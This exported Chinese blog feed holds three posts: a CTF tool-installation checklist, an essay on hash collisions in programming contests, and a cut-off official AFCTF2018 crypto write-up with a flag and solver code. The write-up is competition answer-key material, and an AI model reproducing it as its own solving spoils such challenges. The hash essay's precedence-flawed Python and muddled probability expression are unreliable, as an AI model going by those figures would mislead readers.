      <url>/CTF%E7%94%A8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      <content type="html"><![CDATA[<h1 id="目前工具集合"><a href="#目前工具集合" class="headerlink" title="目前工具集合"></a>目前工具集合</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul><li style="list-style: none"><input type="checkbox" checked> 86架构及基本库</li><li style="list-style: none"><input type="checkbox" checked> wine32</li></ul><h2 id="安装式"><a href="#安装式" class="headerlink" title="安装式"></a>安装式</h2><p>这里的话就是那种安装以后直接用的，也有的是插件</p><ul><li style="list-style: none"><input type="checkbox" checked> pwndbg</li><li style="list-style: none"><input type="checkbox" checked> r2</li><li style="list-style: none"><input type="checkbox" checked> Audacity</li></ul><h2 id="非安装式"><a href="#非安装式" class="headerlink" title="非安装式"></a>非安装式</h2><p>这里的是不用/不能安装的库，比如脚本等</p><p>统一放置在/opt/目录下，可能根据类别再分</p><ul><li style="list-style: none"><input type="checkbox" checked> rsatool</li><li style="list-style: none"><input type="checkbox" checked> cloacked-pixel</li><li style="list-style: none"><input type="checkbox" checked> volatility</li><li style="list-style: none"><input type="checkbox" checked> routerpassview</li><li style="list-style: none"><input type="checkbox" checked> Stegsolve </li><li style="list-style: none"><input type="checkbox"> CTFcrackTools</li></ul><h2 id="Python库"><a href="#Python库" class="headerlink" title="Python库"></a>Python库</h2><ul><li style="list-style: none"><input type="checkbox" checked> pwntools</li><li style="list-style: none"><input type="checkbox" checked> gmpy2</li><li style="list-style: none"><input type="checkbox" checked> unicorn</li><li style="list-style: none"><input type="checkbox" checked> zio</li><li style="list-style: none"><input type="checkbox" checked> angr</li><li style="list-style: none"><input type="checkbox" checked> request </li></ul><a id="more"></a><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h2><h3 id="86架构及其个别基本库"><a href="#86架构及其个别基本库" class="headerlink" title="86架构及其个别基本库"></a>86架构及其个别基本库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dpkg --add-architecture i386 </span><br><span class="line">apt-get update</span><br><span class="line">apt-get -f dist-upgrade </span><br><span class="line">apt-get update</span><br><span class="line">apt-get install lib32c-dev lib32stdc++6</span><br></pre></td></tr></table></figure><h3 id="wine32"><a href="#wine32" class="headerlink" title="wine32"></a>wine32</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install wine32</span><br></pre></td></tr></table></figure><h2 id="安装式-1"><a href="#安装式-1" class="headerlink" title="安装式"></a>安装式</h2><h3 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python3.7-dev</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg /opt/pwndbg</span><br><span class="line"><span class="built_in">cd</span> /opt/pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>如果对pip无法用的时候怎么安装感兴趣，可以戳<a href="http://csuwangj.top/2018/07/21/在pip连不上网的时候安装pwntools/" target="_blank" rel="noopener">这里</a></p><h3 id="r2"><a href="#r2" class="headerlink" title="r2"></a>r2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/radare/radare2.git /opt/r2</span><br><span class="line"><span class="built_in">cd</span> /opt/r2/</span><br><span class="line">sys/install.sh</span><br></pre></td></tr></table></figure><h3 id="Audacity"><a href="#Audacity" class="headerlink" title="Audacity"></a>Audacity</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install audacity</span><br></pre></td></tr></table></figure><h2 id="非安装式-1"><a href="#非安装式-1" class="headerlink" title="非安装式"></a>非安装式</h2><table><thead><tr><th>工具</th><th>指令</th><th>备注</th></tr></thead><tbody><tr><td>rsatool</td><td><code>git clone https://github.com/ius/rsatool.git /opt/Crypto/rsatool</code></td><td>Openssl RSA密钥生成</td></tr><tr><td>cloacked-pixel</td><td><code>git clone https://github.com/livz/cloacked-pixel /opt/Steganography/cloacked-pixel</code></td><td>图像隐写</td></tr><tr><td>pattern</td><td>无</td><td></td></tr><tr><td>volatility</td><td><code>git clone https://github.com/volatilityfoundation/volatility.git /opt/Forensics/volatility</code></td><td>内存取证</td></tr><tr><td></td><td></td></tr></tbody></table><h2 id="Python库-1"><a href="#Python库-1" class="headerlink" title="Python库"></a>Python库</h2><p>默认在pip能用的情况下，默认为python2.7，其他版本会备注</p><table><thead><tr><th>工具</th><th>指令</th><th>备注</th></tr></thead><tbody><tr><td>pwntools</td><td><code>pip install pwntools</code></td><td></td></tr><tr><td>gmpy2</td><td><code>apt-get install python-gmpy2</code></td><td></td></tr><tr><td>zio</td><td><code>pip install termcolor zio</code></td><td></td></tr><tr><td>angr</td><td><code>pip install angr</code></td><td></td></tr><tr><td>unicorn</td><td><code>pip install unicorn</code></td><td>pwntools自带，但是不妨碍你只安装它</td></tr><tr><td>request</td><td><code>pip install request</code></td></tr></tbody></table>]]></content>
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> environment </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>关于散列函数的一点思考</title>
      <link href="/%E5%85%B3%E4%BA%8E%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/"/>
      <url>/%E5%85%B3%E4%BA%8E%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/</url>
      <content type="html"><![CDATA[<p>今天在ACM群灌水的时候因为一个题目引发了一些思考，题目是<a href="http://qscoj.cn/#/contest/show/220" target="_blank" rel="noopener">比赛链接</a>的A题</p><a id="more"></a><p>其实题目很明显，3e4的字符串总量，1e3的字符串长度上限，样例就显示了有字母、数字、符号，就10M内存，用字典树妥妥炸了。</p><p>所以就哈希呗。</p><p>幸运的是STL里就有自带的hash函数，于是就水过去了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">set</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt; m;</span><br><span class="line">hash&lt;<span class="built_in">string</span>&gt; h;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">string</span> temp;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">while</span>(n--)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;temp;</span><br><span class="line">m.insert(h(temp));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;m.size()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为其实3e4这个字符串数量还是比较大的，在群里聊起了碰撞的问题，然后发现还是有丶东西，索性写一篇博文分析一下。</p><h2 id="散列函数简介"><a href="#散列函数简介" class="headerlink" title="散列函数简介"></a>散列函数简介</h2><p>散列函数，也称哈希函数，是一种将任意大小数据映射到固定长度数字的单向函数。</p><p>散列函数常见于密码学的目的，随着密码学渗透到计算机的方方面面，因为其一些有用的特性也被用于ACM竞赛中。</p><p>通常来说，好的散列函数拥有以下几个特性：</p><ol><li>确定性。固定输入对应的散列值是固定的。</li><li>分布均一。优秀的散列函数会使得所有值可能出现的概率尽量一致，这也导出了后面引出的一些特性。</li><li>值域固定。比如<code>std::hash</code>的值域为size_t的可表示范围，SHA-1的值域为$[0,2^{160}-1]$。</li></ol><p>于是，用于密码学的散列函数经常有以下的特性：</p><ol><li>单向性。这里有两个含义，一方面来说既然任意大小的数据都被映射到固定范围的一些值上，那么必然是一个多对一的关系，这就是第一个单向的原因；第二个原因则是函数本身的算法经常会保证无法通过散列值计算原始数据可能的集合。</li><li>雪崩效应。一个比特的改变，可能就会引起值的大幅度变化（按CryptoExchane的说法，是一半以上的比特）。这样就很难通过碰撞发起攻击了。</li><li>抗碰撞性。这里具体又分为两种，一种为抗弱碰撞性，另一种为抗强碰撞性，分别对应第二原像攻击和碰撞攻击。<ol><li>抗弱碰撞性。指对于某散列函数$H()$与任意给定的$x$，找到$y≠x$且$H(x)=H(y)$在计算上不可行。</li><li>抗强碰撞性。值对于某散列函数$H()$而言，找到$H(x)=H(y)$且$x≠y$这样的数对在计算上不可行。</li></ol></li><li>公开性。为了鉴别需求，常见的散列函数算法公开，这样任何能够编程的人都可以自己编程验证散列值。</li></ol><h2 id="ACM中的散列函数"><a href="#ACM中的散列函数" class="headerlink" title="ACM中的散列函数"></a>ACM中的散列函数</h2><p>这里毕竟一个是我也退役了，没碰ACM有些时日，另一个我打ACM时也没有学得很深，所以这里的举例只能拿我们讲课的课件来粗糙地分析一下了，如果有误欢迎指出。</p><p>顺便ACM这比赛打过的同学就知道，不可能真写一个类似MD5这样的散列函数，ACM中的散列函数我通常用一句话概括：“又不是不能用。”</p><p>对于ACM当然是够用的，用其他地方就，再商量吧~</p><h3 id="直接模余法"><a href="#直接模余法" class="headerlink" title="直接模余法"></a>直接模余法</h3><p>首先对于整数来说，最简单的方式就是模余法了，这也是很多<strong>题目</strong>处理大数的方式。模余法要尽量模上一个<strong>素数</strong>，这样会使得冲突的可能性降低。</p><p>但是选手在写题的时候通常不会直接模余，因为即便这样冲突降低，但是依然不小，而且会后续规避这样冲突的处理操作并不是很舒服。</p><h3 id="转换-模余-法"><a href="#转换-模余-法" class="headerlink" title="转换(模余)法"></a>转换(模余)法</h3><p>这里请看这个例题<a href="http://acm.hdu.edu.cn/showproblem.php?pid=1496" target="_blank" rel="noopener">(</a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=1496" target="_blank" rel="noopener">HDOJ-1496 Equations</a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=1496" target="_blank" rel="noopener">)</a> </p><p>题意简单，就类似“百钱买百鸡”问题。</p><p>但是如果直接暴力地四重循环，那可就很嗨了……虽说一般一秒做$10^8$简单计算的确可以，但是这题的数据的确就是在超时的边缘。</p><p>正确的做法就是预处理两个变量所有可能对应值的相反数，然后进行查找。</p><p>但是如果直接搞，那就需要开$2×10^7$大小的数组，不仅在MLE的边缘，而且还有初始化TLE的风险。</p><p>所以这里就可以用散列了。具体讨论见<a href="http://acm.hdu.edu.cn/forum/read.php?tid=3276&amp;fpage=0&amp;toread=&amp;page=2" target="_blank" rel="noopener">这里</a></p><p>同样的，对于一个纯字母的字符串来说，也可以进行这样的转换。就是将一个字符串视为二十六进制的数字，然后求这个数字的十进制值，因为可能会溢出，就模上一个素数如$1000000007$这样的。</p><h3 id="字符串HASH——ELFHASH"><a href="#字符串HASH——ELFHASH" class="headerlink" title="字符串HASH——ELFHASH"></a>字符串HASH——ELFHASH</h3><p>这里直接放它的代码吧，十分简短。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ELF Hash Function  </span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">ELFHash</span><span class="params">(<span class="keyword">char</span> *str)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> x = <span class="number">0</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">while</span> (*str)  </span><br><span class="line">    &#123;  </span><br><span class="line">        hash = (hash &lt;&lt; <span class="number">4</span>) + (*str++);<span class="comment">//hash左移4位，把当前字符ASCII存入hash低四位。   </span></span><br><span class="line">        <span class="keyword">if</span> ((x = hash &amp; <span class="number">0xF0000000</span>L) != <span class="number">0</span>)  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="comment">//如果最高的四位不为0，则说明字符多余7个，现在正在存第7个字符，如果不处理，再加下一个字符时，第一个字符会被移出，因此要有如下处理。  </span></span><br><span class="line">            <span class="comment">//该处理，如果最高位为0，就会仅仅影响5-8位，否则会影响5-31位，因为C语言使用的算数移位  </span></span><br><span class="line">            <span class="comment">//因为1-4位刚刚存储了新加入到字符，所以不能&gt;&gt;28  </span></span><br><span class="line">            hash ^= (x &gt;&gt; <span class="number">24</span>);  </span><br><span class="line">            <span class="comment">//上面这行代码并不会对X有影响，本身X和hash的高4位相同，下面这行代码&amp;~即对28-31(高4位)位清零。  </span></span><br><span class="line">            hash &amp;= ~x;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">//返回一个符号位为0的数，即丢弃最高位，以免函数外产生影响。(我们可以考虑，如果只有字符，符号位不可能为负)  </span></span><br><span class="line">    <span class="keyword">return</span> (hash &amp; <span class="number">0x7FFFFFFF</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数写起来十分简单。我把注释也复制过来了，就不多解释了。</p><h2 id="散列值碰撞了，怎么办？"><a href="#散列值碰撞了，怎么办？" class="headerlink" title="散列值碰撞了，怎么办？"></a>散列值碰撞了，怎么办？</h2><p>扯了那么多前篇，终于到这篇博文真实目的了，不过估计会很短……</p><p>既然是散列函数，就要面对这个问题，一旦发生碰撞，很多问题就出来了，这里就简单分析一下针对散列函数的几个攻击吧。同时也会分析一下在ACM中散列函数的一点使用方法。</p><h3 id="穷举攻击"><a href="#穷举攻击" class="headerlink" title="穷举攻击"></a>穷举攻击</h3><p>对于一个理想的散列函数来说，既然满足了上面的几个特性，穷举攻击需要的次数应该就是$\frac{值域}{2}$。</p><p>给你一个懂事的微笑。</p><h3 id="生日攻击"><a href="#生日攻击" class="headerlink" title="生日攻击"></a>生日攻击</h3><p>现在我们就尝试攻击散列函数的强抗碰撞性。这里以<code>std::hash</code>为例。</p><img src="/关于散列函数的一点思考/1527960903963.png" title="cpp reference"><p>基于散列函数的几个特性来说，我们得到值域内任意值的可能性都为$\frac1{2^{32}}$。那么，在计算不同的任意$n$个字符串候，这些散列值都不冲突的可能性就是$\frac{2^{32}-1}{2^{32}}×\frac{2^{32}-2}{2^{32}}×...×\frac{2^{32}-n+1}{2^{32}}$。</p><p>对于题目给的数据，使用下面Python代码可以计算得不发生冲突的概率为$0.9005311337474664$即发生错误的可能性为$0.0994688662525336$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># a.py</span></span><br><span class="line">a = <span class="number">1</span> &lt;&lt; <span class="number">32</span></span><br><span class="line">s = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">30000</span>):</span><br><span class="line">s *= (a-i)/a</span><br><span class="line">print(s)</span><br><span class="line"><span class="comment">#python a.py</span></span><br><span class="line"><span class="comment">#0.9005311337474664</span></span><br></pre></td></tr></table></figure><p>可见这个数字对于脸白的人来说是够了的。</p><h3 id="教练我脸黑——多重散列函数"><a href="#教练我脸黑——多重散列函数" class="headerlink" title="教练我脸黑——多重散列函数"></a>教练我脸黑——多重散列函数</h3><p>那么我们就要考虑找路子了，这里又有两条分支了：</p><ol><li>既然一个散列函数不行，那我就再来一个。之前是把字母字符串视为二十六进制数，那我就加个ELFHASH。这样做的好处是发生冲突的可能性稳定下降（变为两者发生冲突的乘积），坏处是编码难度上升。</li><li>加盐，加不同的盐值。但是这里要求散列函数是对块进行操作的。</li></ol><p>加盐，可以简单理解为在字符串前/后面加上一个字符串，这样就可以使散列值发生变化。</p><p>对散列函数的要求是显而易见的，因为不论是二十六进制还是ELFHASH，只要之前字符串的散列值是同一个，那么在加盐后结果也不会发生改变。（块的大小对这里也会有影响，这里留给读者自行考虑）</p><p>对于<a href="https://stackoverflow.com/questions/19411742/what-is-the-default-hash-function-used-in-c-stdunordered-map?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa" target="_blank" rel="noopener">GCC</a>的<code>std::hash</code>来说，它用的是$MurmurHash Unaligned 2$，是一个分块大小为4的非密码学散列函数。</p><p>考虑理想状况，我们将多个盐值对应的不同散列值作为比对的标准，我们就能在一定程度上解决冲突，这里又能分出两条线。</p><h4 id="将不同散列值放在不同容器里"><a href="#将不同散列值放在不同容器里" class="headerlink" title="将不同散列值放在不同容器里"></a>将不同散列值放在不同容器里</h4><p>考虑这样的比对算法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//There is a bunch of set containers named s[0]/s[1]/etc</span></span><br><span class="line"><span class="built_in">string</span> str;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt;str;</span><br><span class="line">temp = hash(str)</span><br><span class="line"><span class="keyword">if</span>(!s[<span class="number">0</span>].count(temp))&#123;</span><br><span class="line">s[<span class="number">0</span>].insert(temp)</span><br><span class="line">count++</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">temp = hash(str+<span class="string">"salt1"</span>)</span><br><span class="line"><span class="keyword">if</span>(!s[<span class="number">1</span>].count(temp))&#123;</span><br><span class="line">s[<span class="number">1</span>].insert(temp)</span><br><span class="line">count++</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//etc</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么可能会发生这样的问题，就是字符串s在第一次比对时和a串冲突，在第二次比对时又和b串冲突。</p><p>易知对于固定数量$n$的生日攻击来说，不发生冲突的概率$p$是一定的，假设多重散列函数就像我们所想的一样工作，那么该实验可以认为是一个成功率为$1-p$的伯努利实验。</p><p>在$m$重散列函数的情况下，均发生冲突的可能性是$P_0(m)=C_m^0(1-p)^m$，取这次题目的数据来说，两重散列函数发生冲突的概率为$0.009894055353564416$。</p><h4 id="将各散列值包装成一个整体"><a href="#将各散列值包装成一个整体" class="headerlink" title="将各散列值包装成一个整体"></a>将各散列值包装成一个整体</h4><p>也就是说算法改为</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hashv</span>&#123;</span></span><br><span class="line"><span class="keyword">size_t</span> v[<span class="number">2</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">set</span>&lt;hashv&gt; s;</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> str;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;str;</span><br><span class="line">hashv temp</span><br><span class="line">temp.v[<span class="number">0</span>] = hash(str)</span><br><span class="line">temp.v[<span class="number">1</span>] = hash(str+<span class="string">"salt"</span>)</span><br><span class="line"><span class="keyword">if</span>(!s.count(temp))&#123;</span><br><span class="line">    s.insert(temp);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>理想状态下，此时发生单次冲突的概率为两次散列均冲突的概率，即两者的乘积，也就是$2^{64}-2^{33}+1$</p><p>利用以下python代码计算得在题设情况下，不发生冲突的可能性为$0.9999999999999999999971601954045129840219384586382661991347799758614026869784477630643202473665079505271849114917935938025327598810920608449$ ，太强辣！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line">a = <span class="number">1</span> &lt;&lt; <span class="number">64</span> - <span class="number">1</span>&lt;&lt;<span class="number">33</span> +<span class="number">1</span></span><br><span class="line">a = Decimal(str(a))</span><br><span class="line">print(a)</span><br><span class="line">s = Decimal(<span class="string">"1"</span>)</span><br><span class="line">getcontext().prec = <span class="number">2000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">30000</span>):</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> i% <span class="number">1000</span>:</span><br><span class="line">print(i)</span><br><span class="line">s *= (a-Decimal(str(i)))/a</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure><p>可以发现，这样做以后是几何倍数降低发生碰撞的可能性了。</p><p>那么只有一个考虑了，就是这个结构体打算怎么写，不过这个问题就不是我操心的啦~</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>思考使我快乐，即便这篇文章很水嘻嘻嘻</p><p>睡觉去啦~</p>]]></content>
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>AFCTF2018-Crypto_OfficialWriteUp</title>
      <link href="/AFCTF2018-Crypto-OfficialWriteUp/"/>
      <url>/AFCTF2018-Crypto-OfficialWriteUp/</url>
      <content type="html"><![CDATA[<p>最后四个题没人做出来</p><p>题目丢到了github，欢迎来玩~</p><p><a href="https://github.com/CSUwangj/AFCTF2018-Crypto" target="_blank" rel="noopener">https://github.com/CSUwangj/AFCTF2018-Crypto</a></p><a id="more"></a><h1 id="简单题"><a href="#简单题" class="headerlink" title="简单题"></a>简单题</h1><h2 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h2><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>摩尔斯电码转字符，观察会发现是十六进制数，转ASCII码得flag</p><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><code>afctf{1s&#39;t_s0_345y}</code></p><h2 id="BASE"><a href="#BASE" class="headerlink" title="BASE"></a>BASE</h2><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>现在放出加密代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">    flag = bytes(file.read(),<span class="string">'ascii'</span>)</span><br><span class="line">    file.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">30</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    a = random.randint(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">2</span>:</span><br><span class="line">        flag = base64.b64encode(flag)</span><br><span class="line">    <span class="keyword">elif</span> a == <span class="number">1</span>:</span><br><span class="line">        flag = base64.b32encode(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = base64.b16encode(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag_encode.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(str(flag)[<span class="number">2</span>:<span class="number">-1</span>])</span><br><span class="line">    file.close()</span><br></pre></td></tr></table></figure><p>这个问题的关键在于，经过30重加密的文件不可能会小，直接用文本编辑器打开的都完蛋啦。正确姿势是使用十六进制编辑器或者word打开，或者用程序读入一部分后查看内容。</p><p>此外根据题目可以大抵知道这是Base编码。</p><p>解密代码如下，可以在出题人博客找到主要部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line"><span class="comment"># Solution.py</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line">s = <span class="string">""</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag_encode.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">    s = bytes(file.read(),<span class="string">'ascii'</span>)</span><br><span class="line">    file.close()</span><br><span class="line"></span><br><span class="line">lis1 = [s]</span><br><span class="line">lis2 = []</span><br><span class="line">lis3 = []</span><br><span class="line">lis4 = []</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> lis1:</span><br><span class="line">ok = <span class="number">0</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">lis2.append(b64decode(a).decode(<span class="string">'ascii'</span>))</span><br><span class="line">ok = <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">lis2.append(b32decode(a).decode(<span class="string">'ascii'</span>))</span><br><span class="line">ok = <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">lis2.append(b16decode(a).decode(<span class="string">'ascii'</span>))</span><br><span class="line">ok = <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ok:</span><br><span class="line">lis3.append(a)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> len(lis2):</span><br><span class="line"><span class="keyword">break</span></span><br><span 